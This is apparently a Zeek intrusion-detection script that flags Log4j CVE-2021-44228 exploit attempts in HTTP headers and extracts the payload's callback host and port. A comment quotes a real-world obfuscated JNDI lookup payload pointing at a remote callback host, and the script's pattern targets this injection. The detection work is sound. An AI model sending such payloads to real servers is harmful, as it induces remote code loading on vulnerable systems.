module CVE_2021_44228;

redef enum Notice::Type += {
        LOG4J_ATTEMPT_HEADER,
        LOG4J_SUCCESS
    };

redef enum HTTP::Tags += {
        LOG4J_RCE
    };

global exploit_pattern: pattern = /\$\{/;

event http_header(c: connection, is_orig: bool, name: string, value: string)
    {
    # Focus is mainly on client headers, but adding server to explore anything interesting cases the wild
    # if (!is_orig)
    #     return;
    # Focus is mainly on value of header, but adding name to explore what is being used in the wild
    if (exploit_pattern in name || exploit_pattern in value)
        {
        # Have seen FP's in Polaris of binary data that happens to have ${ in it, eg winRM.
        if (!is_ascii(value))
            return;
        # Add a tag to http.log
        add c$http$tags[LOG4J_RCE];

        # TODO add to a clusterized set for watching of subsequent traffic (LOG4J_SUCCESS notice). 
        # If payload_host is a domain and not an IP, need to work out how to handle that, DNS ? Intel framework ?
        # Also need to treat (or ignore) this style of obfuscation that Binary Edge for example are using
        #  note the ${upper:a has caused the error in host.
        # "uri='/', payload_uri=world443.log4j.bin${upper:a, payload_stem=world443.log4j.bin${upper:a, payload_host=world443.log4j.bin${upper, payload_port=a, method=GET, is_orig=T, header name='USER-AGENT',  header value='${jndi:${lower:l}${lower:d}a${lower:p}://world443.log4j.bin${upper:a}ryedge.io:80/callback}' " 
        local payload_uri = split_string(split_string(value,/\/\//)[(|split_string| - 1)],/\}/)[0];
        local payload_stem = split_string1(payload_uri,/\//)[0];
        local payload_host = split_string1(payload_stem,/\:/)[0];
        local payload_port = split_string1(payload_stem,/\:/)[1];

        NOTICE([$note=LOG4J_ATTEMPT_HEADER,
                $conn=c, 
                $identifier=cat(c$id$orig_h,c$id$resp_h,c$id$resp_p,cat(name,value)),
                # $suppress_for=3600sec,
                $msg=fmt("Possible Log4j exploit CVE-2021-44228 exploit in header. Refer to sub field for sample of payload, original_URI and list of server headers"),
                $sub=fmt("uri='%s', payload_uri=%s, payload_stem=%s, payload_host=%s, payload_port=%s, method=%s, is_orig=%s, header name='%s',  header value='%s' ", c$http$uri, payload_uri, payload_stem, payload_host, payload_port, c$http$method, is_orig, name, value)]);
        }
    }
